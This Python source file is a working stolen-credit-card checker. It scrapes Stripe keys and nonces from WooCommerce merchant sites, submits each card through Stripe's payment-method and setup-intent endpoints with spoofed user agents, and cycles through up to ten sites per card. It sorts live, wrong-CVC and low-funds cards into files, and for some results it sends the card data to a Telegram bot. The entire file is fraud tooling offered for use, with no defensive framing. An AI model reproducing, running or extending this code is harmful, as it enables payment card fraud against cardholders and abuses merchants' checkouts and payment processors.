import requests
import re
import uuid
import time
import logging
from user_agent import generate_user_agent

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger()

STRIPE_URL = "https://api.stripe.com/v1/payment_methods"

def generate_uuids():
    return {
        "gu": uuid.uuid4(),
        "mu": uuid.uuid4(),
        "si": uuid.uuid4()
    }

def prepare_headers():
    user_agent = generate_user_agent()
    return {
        'user-agent': user_agent,
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/'
    }

def send_telegram_message(message, chat_id, bot_token):
    try:
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        requests.post(url, data={"chat_id": chat_id, "text": message}, timeout=10)
    except Exception as e:
        logger.error(f"Telegram send message error: {e}")

def fetch_nonce_and_key(api_url, headers, retries=3, delay=1):
    for attempt in range(retries):
        try:
            resp = requests.get(api_url, headers=headers, timeout=10)
            if resp.status_code == 200:
                nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', resp.text)
                key_match = re.search(r'"key":"(.*?)"', resp.text)
                if nonce_match and key_match:
                    return nonce_match.group(1), key_match.group(1)
        except Exception as e:
            logger.warning(f"Nonce/key fetch attempt {attempt+1} failed at {api_url}: {e}")
        time.sleep(delay)
    return None, None

def process_single_card_for_site(card_data, headers, uuids, chat_id, bot_token, api_url):
    nonce, key = fetch_nonce_and_key(api_url, headers)
    if not nonce or not key:
        msg = f"Skipped {card_data} (missing nonce/key) at {api_url}"
        logger.error(msg)
        return "DECLINED", msg, card_data

    try:
        cleaned = re.sub(r'\s*\|\s*', '|', card_data.strip())
        number, exp_month, exp_year, cvc = cleaned.split('|')
        if len(exp_year) == 4:
            exp_year = exp_year[-2:]
    except Exception:
        msg = f"Invalid format: {card_data}"
        logger.error(msg)
        return "INVALID_FORMAT", msg, card_data

    stripe_data = {
        'type': 'card',
        'card[number]': number,
        'card[cvc]': cvc,
        'card[exp_year]': exp_year,
        'card[exp_month]': exp_month,
        'guid': str(uuids["gu"]),
        'muid': str(uuids["mu"]),
        'sid': str(uuids["si"]),
        'key': key,
        '_stripe_version': '2024-06-20',
    }

    try:
        stripe_resp = requests.post(STRIPE_URL, headers=headers, data=stripe_data, timeout=15)
        stripe_resp.raise_for_status()
        stripe_json = stripe_resp.json()
        payment_method_id = stripe_json.get('id')
        if not payment_method_id:
            raise ValueError("No payment method ID in Stripe response")
    except Exception as e:
        msg = f"Stripe token error for {card_data}: {e}"
        logger.error(msg)
        return "DECLINED", msg, card_data

    setup_data = {
        'action': 'create_and_confirm_setup_intent',
        'wc-stripe-payment-method': payment_method_id,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': nonce,
    }

    try:
        confirm_resp = requests.post(
            api_url,
            params={'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'},
            headers=headers,
            data=setup_data,
            timeout=15
        )
        confirm_resp.raise_for_status()
        resp_json = confirm_resp.json()
        success = resp_json.get('success', False)
        text = confirm_resp.text

        if success:
            # Removed sending "AUTH ..." message to avoid duplicates
            with open('AUTH.txt', 'a') as f:
                f.write(f"{card_data}\n")
            return "CHARGED", f"AUTH {card_data}", card_data

        if "Your card's security code is incorrect." in text:
            message = f"Incorrect CVC {card_data}"
            send_telegram_message(message, chat_id, bot_token)
            with open('IncorrectCVC.txt', 'a') as f:
                f.write(f"{card_data}\n")
            return "CVV", message, card_data

        if "Your card has insufficient funds." in text:
            message = f"Insufficient {card_data}"
            send_telegram_message(message, chat_id, bot_token)
            with open('Insuff.txt', 'a') as f:
                f.write(f"{card_data}\n")
            return "LOW_FUNDS", message, card_data

        error_msg = resp_json.get('data', {}).get('error', {}).get('message', 'Unknown error')
        message = f"DEAD {card_data} >> {error_msg}"
        return "DECLINED", message, card_data

    except Exception as e:
        msg = f"Setup intent error for {card_data}: {e}"
        logger.error(msg)
        return "DECLINED", msg, card_data

def check_card_across_sites(card_data, headers, uuids, chat_id, bot_token, sites):
    for idx, site_url in enumerate(sites[:10], start=1):
        status, msg, raw = process_single_card_for_site(card_data, headers, uuids, chat_id, bot_token, site_url)
        if status in ["CHARGED", "CVV", "CCN", "LOW_FUNDS"]:
            msg += f"\nSite: {idx}"
            return status, msg, raw
    return "DECLINED", f"Declined on all sites: {card_data}", card_data
